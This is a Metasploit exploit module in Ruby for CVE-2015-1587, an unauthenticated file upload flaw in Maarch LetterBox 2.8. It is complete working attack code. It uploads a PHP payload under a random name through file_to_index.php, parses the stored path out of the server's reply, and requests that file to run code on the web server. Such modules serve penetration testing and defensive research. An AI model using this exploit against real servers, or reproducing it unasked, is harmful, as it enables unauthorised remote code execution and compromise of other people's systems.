# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;uri&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;Maarch LetterBox 2.8 Unrestricted File Upload&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a file upload vulnerability on Maarch LetterBox 2.8 due to a lack of
        session and file validation in the file_to_index.php script. It allows unauthenticated
        users to upload files of any type and subsequently execute PHP scripts in the context of
        the web server.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Rob Carr <rob[at]rastating.com>&#039;
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2015-1587&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 11 2015&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;Maarch LetterBox 2.8&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Maarch LetterBox&#039;, &#039;/&#039;])
      ], self.class)
  end

  def letterbox_login_url
    normalize_uri(target_uri.path, &#039;login.php&#039;)
  end

  def letterbox_upload_url
    normalize_uri(target_uri.path, &#039;file_to_index.php&#039;)
  end

  def check
    res = send_request_cgi(&#039;method&#039; => &#039;GET&#039;, &#039;uri&#039; => letterbox_login_url)
    if res.nil? || res.code != 200
      return Msf::Exploit::CheckCode::Unknown
    elsif res.body.include?(&#039;alt="Maarch Maerys Archive v2.1 logo"&#039;)
      return Msf::Exploit::CheckCode::Appears
    end

    Msf::Exploit::CheckCode::Safe
  end

  def generate_mime_message(payload, name)
    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, &#039;text/plain&#039;, &#039;binary&#039;, "form-data; name=\"file\"; filename=\"#{name}\"")
    data
  end

  def exploit
    print_status("#{peer} - Preparing payload...")
    payload_name = "#{Rex::Text.rand_text_alpha(10)}.php"
    data = generate_mime_message(payload, payload_name)

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => letterbox_upload_url,
      &#039;ctype&#039;     => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;      => data.to_s
    )
    fail_with(Failure::Unreachable, &#039;No response from the target&#039;) if res.nil?
    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200

    print_status("#{peer} - Parsing server response...")
    captures = res.body.match(/\[local_path\] => (.*\.php)/i).captures
    fail_with(Failure::UnexpectedReply, &#039;Unable to parse the server response&#039;) if captures.nil? || captures[0].nil?
    payload_url = normalize_uri(target_uri.path, captures[0])
    print_good("#{peer} - Response parsed successfully")

    print_status("#{peer} - Executing the payload at #{payload_url}")
    register_files_for_cleanup(File.basename(URI.parse(payload_url).path))
    send_request_cgi({ &#039;uri&#039; => payload_url, &#039;method&#039;  => &#039;GET&#039; }, 5)
  end
end

